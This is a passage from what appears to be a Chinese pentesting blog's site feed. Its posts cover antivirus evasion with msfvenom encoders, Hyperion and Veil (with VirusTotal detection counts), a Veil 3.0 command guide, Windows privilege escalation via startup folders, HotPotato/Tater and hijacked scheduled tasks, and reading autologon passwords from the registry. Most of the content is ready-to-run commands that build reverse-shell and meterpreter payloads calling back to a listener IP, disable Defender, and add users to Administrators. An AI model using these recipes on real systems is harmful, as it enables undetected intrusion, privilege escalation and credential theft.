asciidoc"><span class="hljs-section">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1234 -f exe -e x86/shikata_ga_nai -i 9 -o payload.exe</span><br><span class="hljs-section">---</span><br>添加参数： -e x86/shikata_ga_nai -i 9 <br></code></pre></div></td></tr></table></figure><p>virscan 49款杀软有27款报告是恶意文件。<br>virustotal 68款有54款报告是恶意文件。</p><p>可以看出比上一次检出少了一款杀软，但也没有好太多。</p><h3 id="使用编码模块–encrypt"><a href="#使用编码模块–encrypt" class="headerlink" title="使用编码模块–encrypt"></a>使用编码模块–encrypt</h3><figure class="highlight brainfuck"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">msfvenom</span> <span class="hljs-literal">-</span><span class="hljs-comment">p</span> <span class="hljs-comment">windows/shell_reverse_tcp</span> <span class="hljs-comment">LHOST=192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">1</span><span class="hljs-string">.</span><span class="hljs-comment">1</span> <span class="hljs-comment">LPORT=1234</span> <span class="hljs-literal">-</span><span class="hljs-comment">f</span> <span class="hljs-comment">exe</span> --<span class="hljs-comment">encrypt</span> <span class="hljs-comment">rc4</span> --<span class="hljs-comment">encrypt</span><span class="hljs-literal">-</span><span class="hljs-comment">key</span> <span class="hljs-comment">whale3070</span> <span class="hljs-literal">-</span><span class="hljs-comment">o</span> <span class="hljs-comment">shell_reverse</span><span class="hljs-string">.</span><span class="hljs-comment">exe</span><br><span class="hljs-comment">添加参数：</span>--<span class="hljs-comment">encrypt</span> <span class="hljs-comment">rc4</span> --<span class="hljs-comment">encrypt</span><span class="hljs-literal">-</span><span class="hljs-comment">key</span> <span class="hljs-comment">whale3070</span> <br></code></pre></div></td></tr></table></figure><p>virscan 49款杀软有30款报告是恶意文件。<br>virustotal 71款有58款报告是恶意文件。</p><h3 id="将载荷放入正常文件"><a href="#将载荷放入正常文件" class="headerlink" title="将载荷放入正常文件"></a>将载荷放入正常文件</h3><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-section">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload.exe</span><br><span class="hljs-section">---</span><br>添加参数：-e x86/shikata_ga_nai -i 9 <br>-x /usr/share/windows-binaries/plink.exe<br></code></pre></div></td></tr></table></figure><p>virscan 49款杀软有23款报告是恶意文件。<br>virustotal 68款有46款报告是恶意文件。</p><h3 id="使用软件保护程序加密载荷"><a href="#使用软件保护程序加密载荷" class="headerlink" title="使用软件保护程序加密载荷"></a>使用软件保护程序加密载荷</h3><p>Hyperion</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/veil-Framework/</span>veil-Evasion.git<br>cd Veil-Evasion<span class="hljs-regexp">/tools/</span>hyperion<br><br><span class="hljs-comment">#编译</span><br><span class="hljs-comment">#i686-w64-mingw32-c++ Src/Crypter/*.cpp -o hyperion.exe</span><br><span class="hljs-comment">#i686-w64-mingw32-g++ Src/Crypter/*.c -o hyperion.exe</span><br>i686-w64-mingw32-gcc -ISrc<span class="hljs-regexp">/Payloads/</span>Aes<span class="hljs-regexp">/c Src/</span>Crypter<span class="hljs-regexp">/*.c Src/</span>Payloads<span class="hljs-regexp">/Aes/</span>c/*.c -o hyperion.exe<br><br><span class="hljs-comment">#将该程序防止在这个目录下，方便以后查找</span><br>cp hyperion.exe <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/windows-binaries/</span><br><br><span class="hljs-comment">##添加动态链接库</span><br>locate libgcc_s_sjlj-<span class="hljs-number">1</span>.dll<br>cp <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/gcc/i</span>686-w64-mingw32<span class="hljs-regexp">/8.3-win32/</span>libgcc_s_sjlj-<span class="hljs-number">1</span>.dll .<br>locate libstdc++-<span class="hljs-number">6</span>.dll<br>cp <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/gcc/</span>x86_64-w64-mingw32<span class="hljs-regexp">/8.3-win32/</span>libstdc++-<span class="hljs-number">6</span>.dll .<br><br><span class="hljs-comment">#运行该程序</span><br>apt-get -y install wine<br>apt-get -y install wine32<br><br>wine hyperion.exe payload.exe encoded.exe<br><span class="hljs-comment">#payload使用的不使用任何编码生成的payload.exe</span><br></code></pre></div></td></tr></table></figure><p>virscan 49款杀软有 16 款报告是恶意文件。<br>virustotal 72款有 48 款报告是恶意文件。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/4.PNG" alt="4"></p><p>没有起到太大效果，但还是有效果的。</p><h3 id="使用自定义-不常用的工具和载荷"><a href="#使用自定义-不常用的工具和载荷" class="headerlink" title="使用自定义/不常用的工具和载荷"></a>使用自定义/不常用的工具和载荷</h3><p>通过搜索源代码，然后编译的方式，可以编译更加不容易被杀软检测到标志位的载荷。<br>因为杀软通常会针对流行的msfvenom找出识别模式，所以使用少见的工具或者手动编译就可以减少被识别出的几率。</p><h3 id="veil免杀"><a href="#veil免杀" class="headerlink" title="veil免杀"></a>veil免杀</h3><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">`veil -t Evasion -p 34 --ordnance-payload rev_tcp --ip 192.168.1.5 --port 8677 -o chrisout -c <span class="hljs-attribute">hostname</span>=thegrid <span class="hljs-attribute">processors</span>=2`<br></code></pre></div></td></tr></table></figure><p>该命令会生成一个可执行的载荷。设置了免杀载荷编号为34。使用军械库模块生成反弹tcp的shellcode，反弹连接的IP、端口如命令所示。生成的可执行程序名称为chrisout，并且执行了两项检查，载荷被设置为目标机器的主机名为thegrid，系统的进程至少是2个。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/5.PNG" alt="5"></p><p>virscan 49款杀软有 2 款报告是恶意文件。<br>virustotal 71款有 8 款报告是恶意文件。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/15.PNG" alt="15"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/14.PNG" alt="14"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://rafaelhart.com/2019/10/installing-hyperion-on-kali-linux/">https://rafaelhart.com/2019/10/installing-hyperion-on-kali-linux/</a></li><li><a href="https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/release">https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/release</a></li><li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-evade-av-detection-with-veil-evasion-0162363/">https://null-byte.wonderhowto.com/how-to/hack-like-pro-evade-av-detection-with-veil-evasion-0162363/</a></li><li><a href="https://www.veil-framework.com/veil-tutorial/">https://www.veil-framework.com/veil-tutorial/</a></li><li><a href="https://www.veil-framework.com/veil-command-line-usage/">https://www.veil-framework.com/veil-command-line-usage/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过杀软之Veil3.0官方指南</title>
    <link href="/2020/02/26/11-x/"/>
    <url>/2020/02/26/11-x/</url>
    
    <content type="html"><![CDATA[<p>本文翻译自<a href="https://www.veil-framework.com/veil-command-line-usage/">Veil官方文档</a></p><p>大部分Veil用户将利用Veil的交互式菜单生成shellcode和或Veil载荷。 但是，我猜测虽然只有少数用户会使用命令行选项，但他们使用的相当频繁。 因此，我想确保在Veil用户在想要通过script来使用时（或任何其他方式）存在命令行界面。 在Veil 3.0版本中，一些选项是相同的，但是该工具引入了更多的命令行选项，这就是我在本文中想要介绍的。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">apt-get -y install veil-evasion          <span class="hljs-comment">#下载veil-evasion组件</span><br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/veil/</span>config<span class="hljs-regexp">/setup.sh --force --silent    # &quot;安静&quot;的安装，不需要提示输入yes/</span>no。安装需要很长时间，请耐心等待<br>veil     <span class="hljs-comment">#输入veil即可进行该模块</span><br></code></pre></div></td></tr></table></figure><h1 id="1-Ordnance——军械库"><a href="#1-Ordnance——军械库" class="headerlink" title="1. Ordnance——军械库"></a>1. Ordnance——军械库</h1><p>我将在命令行中介绍如何在Veil中使用军械库，这应该非常简单。 如果你以前从未使用过军械库，那么该工具比msfvenom生成shellcode更加易用。</p><h3 id="1-1-列出军械库的所有载荷"><a href="#1-1-列出军械库的所有载荷" class="headerlink" title="1.1 列出军械库的所有载荷"></a>1.1 列出军械库的所有载荷</h3><p><code>veil -t Ordnance --list-payloads</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/6.PNG" alt="6"></p><h3 id="1-2-列出军械库的所有编码模块"><a href="#1-2-列出军械库的所有编码模块" class="headerlink" title="1.2 列出军械库的所有编码模块"></a>1.2 列出军械库的所有编码模块</h3><p><code>veil -t Ordnance --list-encoders</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/7.PNG" alt="7"></p><h3 id="1-3-生成反弹TCP载荷"><a href="#1-3-生成反弹TCP载荷" class="headerlink" title="1.3 生成反弹TCP载荷"></a>1.3 生成反弹TCP载荷</h3><p><code>veil -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234</code></p><p>使用军械库模块，指定反弹的ip为192.168.1.20、端口为1234，生成反弹tcp载荷。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/8.PNG" alt="8"></p><h3 id="1-4-生成反弹HTTP载荷"><a href="#1-4-生成反弹HTTP载荷" class="headerlink" title="1.4 生成反弹HTTP载荷"></a>1.4 生成反弹HTTP载荷</h3><p><code>veil -t Ordnance --ordnance-payload rev_http --ip 192.168.1.21 --port 1235 -e xor -b \\x13\\x98</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/9.PNG" alt="9"></p><p>使用军械库模块，指定反弹的ip为192.168.1.21、端口为1235，生成反弹http载荷。并且该命令还设置了xor编码、避免使用坏字符<code>\x13\x98</code></p><h1 id="2-Evasion——免杀"><a href="#2-Evasion——免杀" class="headerlink" title="2. Evasion——免杀"></a>2. Evasion——免杀</h1><h3 id="2-1-列出免杀模块的所有载荷"><a href="#2-1-列出免杀模块的所有载荷" class="headerlink" title="2.1 列出免杀模块的所有载荷"></a>2.1 列出免杀模块的所有载荷</h3><p><code>veil -t Evasion --list-payloads</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/10.PNG" alt="10"></p><h3 id="2-2-使用33免杀模块生成可执行文件"><a href="#2-2-使用33免杀模块生成可执行文件" class="headerlink" title="2.2 使用33免杀模块生成可执行文件"></a>2.2 使用33免杀模块生成可执行文件</h3><p><code>veil -t Evasion -p 33 --ordnance-payload rev_tcp --ip 192.168.1.3 --port 8675 -o christest</code></p><p>该命令会生成一个可执行的载荷。设置了免杀载荷编号为33。通过上一小节查询到<code>33) python/shellcode_inject/flat.py</code>，就可以指定<code>-p 33</code>。</p><p>使用的是军械库反弹tcp的载荷，设置反弹IP<code>192.168.1.3</code>和<code>8675</code>，设置生成的文件名为<code>christest</code>。要注意的是，该命令使用的是Ordnance军械库模块来生成shellcode。</p><h3 id="2-3-使用41免杀模块生成可执行文件"><a href="#2-3-使用41免杀模块生成可执行文件" class="headerlink" title="2.3 使用41免杀模块生成可执行文件"></a>2.3 使用41免杀模块生成可执行文件</h3><p><code>veil  -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/13.PNG" alt="13"><br>使用指定ip和端口、免杀载荷为41，生成一个windows平台反弹meterpreter的载荷。和上一小节不同的是，使用的是msfvenom而不是军械库模块来生成shellcode。</p><p>生成的应用程序，可以使用<code>file var/lib/veil/output/compiled/chris.exe</code>进行查看。</p><h3 id="2-4-使用34免杀模块生成可执行文件"><a href="#2-4-使用34免杀模块生成可执行文件" class="headerlink" title="2.4 使用34免杀模块生成可执行文件"></a>2.4 使用34免杀模块生成可执行文件</h3><p><code>veil -t Evasion -p 34 --ordnance-payload rev_tcp --ip 192.168.1.5 --port 8677 -o chrisout -c hostname=thegrid processors=2</code></p><p>该命令会生成一个可执行的载荷。设置了免杀载荷编号为34。使用军械库模块生成反弹tcp的shellcode，反弹连接的IP、端口如命令所示。生成的可执行程序名称为chrisout，并且执行了两项检查，载荷被设置为目标机器的主机名为thegrid，系统的进程至少是2个。</p><p>如果你只想检查主机名，就可以删除<code>processors=2</code>，内置这样的基本检查，当尝试枚举和绕过沙箱的时候很有用。</p><p>如果是使用python免杀模块，编号从25到36，那么编译的时候很可能出错。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/12.PNG" alt="12"></p><p>当出现错误，<code>ImportError: No module named &#39;past&#39;</code></p><p>可以使用以下命令，手动将py脚本编译为exe，生成的程序在build文件夹下。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wine pyinstaller <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/veil/</span>output<span class="hljs-regexp">/source/</span>chrisout10.py<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/11.PNG" alt="11"></p><p>如果出现了上图的错误，可以安装<code>apt-get install winbind</code></p><h3 id="2-5-删除所有生成的载荷"><a href="#2-5-删除所有生成的载荷" class="headerlink" title="2.5 删除所有生成的载荷"></a>2.5 删除所有生成的载荷</h3><p><code>veil  --clean</code></p><p> 如果您创建了多个有效负载，并且只想删除所有编译后的输出，源代码，处理程序文件和跟踪的哈希，请运行此命令，Veil将删除所有内容。</p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可修改的开机自启文件夹</title>
    <link href="/2020/02/24/12-x/"/>
    <url>/2020/02/24/12-x/</url>
    
    <content type="html"><![CDATA[<h2 id="自启文件夹"><a href="#自启文件夹" class="headerlink" title="自启文件夹"></a>自启文件夹</h2><p>单用户的自启文件夹</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\用</span>户名<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartup<br></code></pre></div></td></tr></table></figure><p>所有用户的自启文件夹</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogramData<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartup<br></code></pre></div></td></tr></table></figure><h2 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\A</span>ccesschk<span class="hljs-symbol">\a</span>ccesschk64.exe -wvu &quot;C:<span class="hljs-symbol">\P</span>rogramData<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartup&quot;<br>---<br><br></code></pre></div></td></tr></table></figure><h2 id="生成攻击载荷"><a href="#生成攻击载荷" class="headerlink" title="生成攻击载荷"></a>生成攻击载荷</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">192.168.1.101</span> -P <span class="hljs-number">4444</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168.1.101</span> LPORT=<span class="hljs-number">4444</span> -f exe -o payload.exe<br></code></pre></div></td></tr></table></figure><p>将payload.exe放在startup文件夹下，当管理员登陆，即可获得shell。</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HotPotato提权</title>
    <link href="/2020/02/23/05-x/"/>
    <url>/2020/02/23/05-x/</url>
    
    <content type="html"><![CDATA[<h1 id="HotPotato提权"><a href="#HotPotato提权" class="headerlink" title="HotPotato提权"></a>HotPotato提权</h1><p>参考资料：</p><ul><li><a href="https://pentestlab.blog/2017/04/13/hot-potato/">https://pentestlab.blog/2017/04/13/hot-potato/</a></li><li><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">hot-potato漏洞发现者的博客</a></li><li><a href="https://ivanitlearning.wordpress.com/2019/07/20/potato-privilege-escalation-exploits-for-windows/comment-page-1/">https://ivanitlearning.wordpress.com/2019/07/20/potato-privilege-escalation-exploits-for-windows/comment-page-1/</a></li><li><a href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></li><li><a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html">NTLM Reflection Bugs</a></li></ul><p>视频教程地址：<a href="https://www.bilibili.com/video/av91087772">https://www.bilibili.com/video/av91087772</a></p><p>该技术由两个已知的windows问题组成。1. NBNS欺骗 2.NTLM中继与伪造的WPAD代理服务器的实现</p><p>NBNS是广播UDP协议，用于Windows环境中常用的名称解析。</p><p>通过与SMB相同的协议进行的NTLM身份验证已由Microsoft修补，但是该技术使用HTTP到SMB身份验证以创建高特权服务，因为HTTP请求可能来自诸如Windows更新之类的高特权服务。 由于流量包含NTLM凭据，并且正在通过伪造的代理服务器传递，因此可以对其进行捕获并将其传递给本地SMB侦听器，以创建可以作为SYSTEM执行任何命令的服务。</p><p>引申出一个话题，编程能力到底重要不重要？对于渗透测试，coding是一个什么样的地位？黑客就是程序员吗？</p><p>水平高超的黑客必定掌握娴熟的编码能力，使用程序来达到自己的目的。</p><p>世界上的编程语言几十种上百种，是个人都不能完全掌握。只要完全掌握一种编程语言，加上一种脚本语言就够了。</p><p>掌握的越多越好？<br>二十一世纪是分工与合作的世纪，掌握的多不代表就精通。不如一个人掌握一个方面，然后与其他人合作。</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">#windows 7运行：<br>powershell.exe -nop -ep bypass<br>Import-Module C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\T</span>ater<span class="hljs-symbol">\T</span>ater.ps1<br><br>Invoke-Tater -Trigger 1 -Command &quot;net localgroup administrators user /add&quot;<br><br>---<br>#windows 10运行：<br>powershell.exe -nop -ep bypass<br>Import-Module C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\T</span>ater<span class="hljs-symbol">\T</span>ater.ps1<br>Invoke-Tater -Trigger 2 -Command &quot;net localgroup administrators user /add&quot;<br></code></pre></div></td></tr></table></figure><p>net user user</p><hr><figure class="highlight swift"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs swift"><span class="hljs-type">Potato</span>.exe <span class="hljs-operator">-</span>ip <span class="hljs-number">192.168</span>.<span class="hljs-number">1.105</span> <span class="hljs-operator">-</span>cmd <span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>Windows<span class="hljs-subst">\\</span>System32<span class="hljs-subst">\\</span>cmd.exe -k net localgroup Administrators user /add&quot;</span> <span class="hljs-operator">-</span>disable_exhaust <span class="hljs-literal">true</span> <span class="hljs-operator">-</span>disable_defender <span class="hljs-literal">true</span><br><br>运行失败<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计划任务的提权</title>
    <link href="/2020/02/22/01-x/"/>
    <url>/2020/02/22/01-x/</url>
    
    <content type="html"><![CDATA[<h1 id="计划任务的提权"><a href="#计划任务的提权" class="headerlink" title="计划任务的提权"></a>计划任务的提权</h1><p>参考资料：</p><ul><li><a href="https://www.youtube.com/watch?v=Kgga91U3B4s&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=13">https://www.youtube.com/watch?v=Kgga91U3B4s&amp;list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&amp;index=13</a></li><li><a href="https://payloads.online/archivers/2018-10-08/1#0x03-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E6%8F%90%E6%9D%83">https://payloads.online/archivers/2018-10-08/1#0x03-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E6%8F%90%E6%9D%83</a></li></ul><p>视频教程地址：</p><h2 id="是否有可修改的计划任务"><a href="#是否有可修改的计划任务" class="headerlink" title="是否有可修改的计划任务"></a>是否有可修改的计划任务</h2><figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">ep</span> <span class="hljs-variable">bypass</span><br><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">user</span>\<span class="hljs-variable">Desktop</span>\<span class="hljs-variable">PowerUp</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ModifiableScheduledTaskFile</span><br></code></pre></div></td></tr></table></figure><p>如果发现了可以修改的计划任务，那么替换为恶意程序。</p><h2 id="学习如何使用计划任务"><a href="#学习如何使用计划任务" class="headerlink" title="学习如何使用计划任务"></a>学习如何使用计划任务</h2><p>**Windows+R **<br>taskschd.msc</p><p>新建计划任务</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfvenom -l formats<br>msfvenom -p windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span> LPORT=<span class="hljs-number">4445</span> -f powershell -o program.ps1<br><br>handler -H <span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span> -P <span class="hljs-number">4445</span> -p windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp<br><br>将program.ps1作为每次开机都会运行的计划任务。重启后即可获得最高权限。<br></code></pre></div></td></tr></table></figure><h2 id="消失的计划任务"><a href="#消失的计划任务" class="headerlink" title="消失的计划任务"></a>消失的计划任务</h2><p>autoruns  计划任务模块，提示未找到该程序<br><code>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -w &quot;C:\Missing Scheduled Binary\&quot;</code></p><h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">192.168.1.101</span> -P <span class="hljs-number">4445</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168.1.101</span> LPORT=<span class="hljs-number">4445</span> -f exe -o program.exe<br></code></pre></div></td></tr></table></figure><p>将program.exe放到目录<code>&quot;C:\Missing Scheduled Binary\&quot;</code>，重启windows</p><p>即可获得反弹shell的最高权限。</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注册表密码挖掘的提权</title>
    <link href="/2020/02/21/12-x/"/>
    <url>/2020/02/21/12-x/</url>
    
    <content type="html"><![CDATA[<p>注册表密码挖掘的提权</p><p>视频教程：<a href="https://www.acfun.cn/v/ac13017016">https://www.acfun.cn/v/ac13017016</a></p><h2 id="自动登陆密码"><a href="#自动登陆密码" class="headerlink" title="自动登陆密码"></a>自动登陆密码</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">powershell -nop -ep bypass<br>Import-Module C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\u</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\P</span>owerUp.ps1<br>Get-RegistryAutoLogon         <br>#查找注册表中自动登陆的密码<br>---<br>1.<br>reg query &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot; /v DefaultUsername<br>2.<br>reg query &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot; /v DefaultPassword<br></code></pre></div></td></tr></table></figure><h2 id="软件密码"><a href="#软件密码" class="headerlink" title="软件密码"></a>软件密码</h2><figure class="highlight 